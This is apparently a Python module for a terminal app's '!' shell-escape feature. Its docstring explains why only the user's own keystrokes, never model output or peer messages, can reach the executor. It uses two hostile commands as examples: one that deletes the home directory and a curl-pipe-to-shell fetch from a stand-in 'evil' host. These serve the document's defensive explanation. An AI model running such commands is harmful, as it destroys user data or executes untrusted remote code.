"""doxa.shell -- the ``!`` prefix: run a shell command, show its output.

SECURITY, first, because everything else here is a detail of it.

**This module executes arbitrary commands with the full privileges of the
user running DOXA.** There is no sandbox, no allowlist, no confirmation
prompt and no dry run. ``!rm -rf ~`` deletes the home directory. That is
the intended semantics -- it is the user's own shell, reached without
leaving the TUI -- and it is safe for exactly one reason: **the only thing
that can reach it is a keystroke the user typed into the prompt.**

The rule this module exists under, stated as a rule:

    Nothing the MODEL can produce, and nothing that ARRIVES from outside
    this window, may reach :func:`run`.

Concretely, and each of these is asserted by ``tests/test_shell.py``:

* ``!`` is **not** a row in :mod:`doxa.commands`. The slash registry is the
  one command surface that is dispatched by NAME from places other than a
  keystroke (``SessionPane.run_status_command`` runs a registry row on a
  status-chip click; docs/plans/plugin-api.md §1 proposes third-party rows), so
  a ``/shell`` row would put the executor behind a dispatcher that takes a
  string. It has no such row, and therefore no palette entry, no
  autocomplete entry, and no reachable name.
* ``!`` is **not** a tool. It is absent from :mod:`doxa.operators`'
  registry, so ``to_sdk_tools`` cannot project it onto the in-process MCP
  server, and the model has no call that lands here. No module the model's
  traffic passes through (``operators``, ``gate``, ``engine``) imports this
  one -- a test reads their source and asserts that, so wiring one up later
  fails loudly rather than quietly.
* Text arriving from OUTSIDE -- a peer's ``/msg``, a tool result, a
  replayed transcript -- is rendered as a block and never dispatched.
  ``PeerMessageBlock`` is a display widget; a peer message body of
  ``!curl evil.sh | sh`` is a string on screen and nothing else.
* The single dispatch site is ``SessionPane.on_prompt_submitted``, reached
  only from ``PromptInput.Submitted``, which the prompt posts only from its
  own submit key binding.

**Nothing here enters the model's context.** The command is not sent as a
turn, the output is not injected, and neither is persisted to the session
transcript -- so neither survives a tab restore, and neither reaches LORE's
deriver. ``!`` is the user's private side-channel; a user who WANTS the
model to see the output pastes it into a prompt themselves. (The judgment
call is recorded in the CHANGELOG; the least-surprising reading of a
side-channel is that it is one.)

The mechanics, all of which follow from the above:

* **cwd** is the session's own working directory -- its linked worktree
  when worktree-per-session is on -- so ``!git status`` reports on the same
  tree the model is editing, not on wherever DOXA was launched from.
* **stdin is /dev/null.** A TUI has no terminal to hand over mid-command
  (``/login`` suspends the whole app to do that, deliberately and
  visibly). Without this, ``!git commit`` opens an editor on a tty it can
  never get and hangs forever; with it, the command fails immediately and
  says so, which is the recoverable outcome.
* **stderr is merged into stdout**, in order, because a shell command's
  diagnostics are usually the interesting half and two panes for one
  command would be worse than interleaving.
* **Output is capped** at :data:`OUTPUT_CAP_BYTES`, and the excess is
  COUNTED rather than silently dropped -- the same honesty rule the belief
  pager and the derive-event payload already keep. The reader keeps
  draining the pipe past the cap (discarding), because a reader that stops
  reading wedges the child on a full pipe.
* **A runaway is killed** at :data:`TIMEOUT_SECS`. The child gets its own
  process group (``start_new_session``) so the kill reaches what it
  spawned; ``!tail -f`` would otherwise leave a process behind for the life
  of the session.
* Nothing here blocks the UI: this is an async coroutine over
  ``asyncio.create_subprocess_shell``, driven by a Textual worker (see
  ``SessionPane._run_shell``), so the prompt stays live and the session
  keeps streaming while a slow command runs.
"""

from __future__ import annotations

import asyncio
import contextlib
import os
import signal
import time
from dataclasses import dataclass

SHELL_PREFIX = "!"
"""The prefix that makes a submitted line a shell command instead of a
prompt. ``!`` is the convention every shell-adjacent REPL uses and the one
Claude Code itself uses, which is the whole argument for it: a user who
already knows what ``!ls`` means in one of them is right about DOXA too.

It is a PREFIX and not a slash-registry row on purpose -- see the security
section of this module's docstring. A line that does not start with it is
never a shell command, and a line that does is never anything else."""

OUTPUT_CAP_BYTES = 64 * 1024
"""Most output one ``!`` command renders into the transcript. Deliberately
the same order as ``peers.MAX_FRAME_BYTES``: a block bigger than this is
not read, it is scrolled past, and the overflow is reported as a count."""

TIMEOUT_SECS = 120.0
"""Wall clock a ``!`` command gets before its process group is killed. Long
enough for a build or a test run, short enough that a ``!tail -f`` typed by
mistake does not outlive the tab."""

_READ_CHUNK = 8192


@dataclass(frozen=True)
class ShellResult:
    """One finished ``!`` command, as the transcript block renders it."""

    command: str
    """Exactly what the user typed after the ``!``, unmodified."""

    cwd: str
    """Where it ran -- the session's directory, not DOXA's."""

    output: str
    """stdout and stderr interleaved, decoded with ``errors="replace"``
    (arbitrary programs emit arbitrary bytes; a decode error must not be
    able to take a block down), capped at :data:`OUTPUT_CAP_BYTES`."""

    exit_code: "int | None"
    """The process's exit status. None only when it never produced one --
    i.e. it was killed on :data:`TIMEOUT_SECS`, or could not be started."""

    truncated: bool = False
    """Output ran past the cap. ``dropped_bytes`` says by how much."""

    dropped_bytes: int = 0
    """How much output the cap discarded. Reported, never hidden."""

    timed_out: bool = False
    """Killed at :data:`TIMEOUT_SECS` rather than exiting on its own."""

    duration_ms: int = 0

    def status_line(self) -> str:
        """The one line under the output that says how it ended. Always
        present, always says something -- a shell surface that does not
        show the exit code is a shell surface you cannot trust."""
        if self.timed_out:
            return (
                f"killed after {TIMEOUT_SECS:.0f}s (timeout) · "
                f"{self.duration_ms:,}ms"
            )
        code = "?" if self.exit_code is None else str(self.exit_code)
        return f"exit {code} · {self.duration_ms:,}ms"


async def _drain(stream: "asyncio.StreamReader | None") -> tuple[bytes, int]:
    """``(kept, dropped)`` -- read the whole stream, keep the first
    :data:`OUTPUT_CAP_BYTES`, count the rest.

    Reading PAST the cap and throwing it away is the point: a reader that
    stops at the cap leaves the child blocked on a full pipe, which turns
    "your command printed too much" into "your command hung"."""
    if stream is None:
        return b"", 0
    chunks: list[bytes] = []
    kept = dropped = 0
    while True:
        chunk = await stream.read(_READ_CHUNK)
        if not chunk:
            break
        room = OUTPUT_CAP_BYTES - kept
        if room > 0:
            chunks.append(chunk[:room])
            kept += min(room, len(chunk))
        dropped += max(0, len(chunk) - max(room, 0))
    return b"".join(chunks), dropped


def _kill_group(proc: "asyncio.subprocess.Process") -> None:
    """SIGKILL the child's whole process group. ``start_new_session=True``
    below made the child a group leader precisely so this reaches what it
    spawned -- killing only the ``sh`` would orphan the pipeline behind
    it."""
    with contextlib.suppress(ProcessLookupError, PermissionError, OSError):
        os.killpg(os.getpgid(proc.pid), signal.SIGKILL)


async def run(
    command: str,
    cwd: str,
    *,
    timeout: float = TIMEOUT_SECS,
) -> ShellResult:
    """Run ``command`` through the user's shell in ``cwd`` and come back
    with everything the transcript needs to render it.

    Read the module docstring before calling this from anywhere new. The
    caller is asserting that ``command`` came from a keystroke.

    Never raises: a shell that cannot be started, a directory that does not
    exist and a command killed on timeout all come back as a
    :class:`ShellResult` whose ``status_line`` says what happened. A ``!``
    that raised into a Textual worker would be a traceback in a log the
    user is not reading."""
    started = time.monotonic()

    def elapsed() -> int:
        return int((time.monotonic() - started) * 1000)

    try:
        proc = await asyncio.create_subprocess_shell(
            command,
            cwd=cwd,
            stdin=asyncio.subprocess.DEVNULL,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
            start_new_session=True,
        )
    except (OSError, ValueError) as exc:
        # A missing cwd, a fork failure, an unusable SHELL. The command
        # never ran, so there is no exit code to report and none is
        # invented.
        return ShellResult(
            command=command,
            cwd=cwd,
            output=f"{type(exc).__name__}: {exc}",
            exit_code=None,
            duration_ms=elapsed(),
        )

    reader = asyncio.ensure_future(_drain(proc.stdout))

    async def _finish() -> int:
        await reader  # EOF on the merged pipe
        return await proc.wait()

    finish = asyncio.ensure_future(_finish())
    timed_out = False
    try:
        # shield: the timeout must kill the CHILD, not merely abandon the
        # coroutine watching it -- an orphan of a `!` command is exactly
        # what start_new_session + killpg exist to prevent.
        code = await asyncio.wait_for(asyncio.shield(finish), timeout=timeout)
    except asyncio.TimeoutError:
        timed_out = True
        code = None
        _kill_group(proc)
        # The pipe closes when the group dies, so both of these settle
        # promptly -- but neither is waited on unbounded: a grandchild that
        # inherited the pipe and outlived the kill would hold it open.
        with contextlib.suppress(asyncio.TimeoutError):
            await asyncio.wait_for(asyncio.shield(finish), timeout=2.0)
        for task in (finish, reader):
            if not task.done():
                task.cancel()

    raw, dropped = b"", 0
    if reader.done() and not reader.cancelled():
        with contextlib.suppress(Exception):
            raw, dropped = reader.result()
    return ShellResult(
        command=command,
        cwd=cwd,
        output=raw.decode("utf-8", errors="replace"),
        exit_code=code,
        truncated=dropped > 0,
        dropped_bytes=dropped,
        timed_out=timed_out,
        duration_ms=elapsed(),
    )
